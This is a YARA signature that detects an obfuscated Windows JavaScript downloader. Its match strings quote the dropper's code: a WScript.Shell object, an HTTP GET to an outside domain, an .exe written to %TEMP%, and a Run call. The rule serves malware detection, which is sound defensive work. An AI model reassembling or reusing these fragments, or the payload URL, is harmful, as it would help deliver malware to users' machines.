rule sig_20160328_1c8665c8a2423e1e39655b3adcd206bb {
  meta:
    description = "datamaliciousorder - file 20160328_1c8665c8a2423e1e39655b3adcd206bb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5628db8907c68609e6d0d784fae4ea60c07f413bddcafc2ca13b5a4d7d356677"

  strings:
    $s1  = "function Afijcwvhw() {return Mpjcq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"8dzemrGDRSyVGo.exe\";};" fullword ascii
    $s2  = "Vgdar[Qdivtxzlrn](\"GET\", \"http://theaffiliatetribe.com/o3uska\", false);" fullword ascii
    $s3  = "do {WScript[Rnwws](Gxvdxvtgd() * 11)} while (Vgdar[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Mpjcq = function Pbdsci() {return WScript[Vseuhx](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Mqfxaaqpoi(Vynerd, Nlvjmdf){return Vynerd - Nlvjmdf;};" fullword ascii
    $s6  = "function Pvgzsvwqcm(Zplyzm){Mpjcq[\"Run\"](Zplyzm, Opyrhwnu, Opyrhwnu);};" fullword ascii
    $s7  = "function Mrkngq() {return ((Zmmjxrhwbs == true) && (Zmmjxrhwbs == Vlbdfqdvz)) ? 1 : Opyrhwnu;};" fullword ascii
    $s8  = "var Zmmjxrhwbs = false;" fullword ascii
    $s9  = " while (Pyhnyi){" fullword ascii
    $s10 = "function Fwpediigq(Bvvgjinkg) {var Dcqxpknt = (1, 2, 3, 4, 5, Bvvgjinkg); return Dcqxpknt;};" fullword ascii
    $s11 = "Vlbdfqdvz = true; " fullword ascii
    $s12 = "function Gxvdxvtgd(){return 22;};" fullword ascii
    $s13 = "var Vlbdfqdvz = false;" fullword ascii
    $s14 = "return Mqfxaaqpoi(Prssbrxf, Zpougwls);" fullword ascii
    $s15 = "function Ekuzsi(){return Vseuhx;};" fullword ascii
    $s16 = "function Iwfxsa(){return Yttxu;};" fullword ascii
    $s17 = "function Bantp()" fullword ascii
    $s18 = "var Ltzsnd = new this[\"Date\"]();" fullword ascii
    $s19 = "Zmmjxrhwbs = true; " fullword ascii
    $s20 = "var Kmudvuzel = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}